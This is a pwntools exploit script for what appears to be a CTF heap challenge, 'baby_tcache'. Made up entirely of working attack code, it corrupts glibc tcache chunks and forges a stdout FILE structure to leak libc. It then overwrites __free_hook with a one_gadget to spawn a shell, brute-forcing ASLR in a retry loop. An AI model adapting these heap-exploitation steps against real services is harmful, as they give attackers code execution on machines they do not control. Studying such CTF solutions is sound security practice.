from pwn import*
#context.log_level = "debug"
context.terminal =["tmux","splitw","-h"]
#p = process('./baby_tcache')


def new(content,size):
    p.recvuntil("Your choice: ")
    p.sendline('1')
    p.recvuntil("Size:")
    p.sendline(str(size))
    p.recvuntil("Data:")
    p.send(content)
    
def delete(idx):
    p.recvuntil("Your choice: ")
    p.sendline('2')
    p.recv()
    p.sendline(str(idx))

def exp():
    new("aaaa",0x410)#0
    new("cccc",0x70)#1
    new("dddd",0x5f0)#2
    new("eeee",0x30)#3

    delete(0)
    delete(1)

    new("a"*0x70 + p64(0x420+0x80),0x78) #0

    delete(2)# trigger 
    delete(0)

    new("aaaa",0x410)#0
    
    new('\x20\xb7',0x88)#1 change tcache->fd to stdout
    new('a',0x78)#2

    fake_file = p64(0xfbad1800) + p64(0)*3 + "\x00"
    new(fake_file,0x78)#4
    
    data = p.recv(0x20)
    
    leak = u64(data[0x18:]) #0x7f0000000000
    if leak&0x7f0000000000==0x7f0000000000:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        log.info("leak_add ==> {}".format(hex(leak)))
        libc_base = leak - libc.symbols['_IO_file_jumps']
        libc.address = libc_base
        free_hook = libc.symbols['__free_hook']
        one_gadget = 0xfccde + libc_base
        log.info("libc_base ==> {}".format(hex(libc_base)))
        delete(1)
        delete(2)   #tcache_dup
        new(p64(free_hook),0x88)
        new('\n',0x88)
        new(p64(one_gadget),0x88)
        delete(3)
        p.interactive()
    else:
        p.close()
    
        
    
if __name__ == '__main__':
    while True:
        try:
            p = process('./baby_tcache')
            exp()
        except Exception as e:
            p.close()
            continue



